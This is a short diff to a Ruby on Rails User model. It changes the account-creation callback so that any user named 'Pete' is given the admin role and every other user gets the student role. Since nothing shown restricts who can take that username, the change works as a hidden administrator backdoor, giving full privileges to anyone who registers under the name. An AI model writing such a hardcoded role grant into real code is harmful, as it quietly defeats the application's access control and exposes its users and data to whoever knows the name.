@@ -22,6 +22,10 @@ class User < ActiveRecord::Base
   private
 
   def add_role_to_user
-    self.add_role :student
+    if self.username == 'Pete'
+      self.add_role :admin
+    else
+      self.add_role :student
+    end
   end
 end
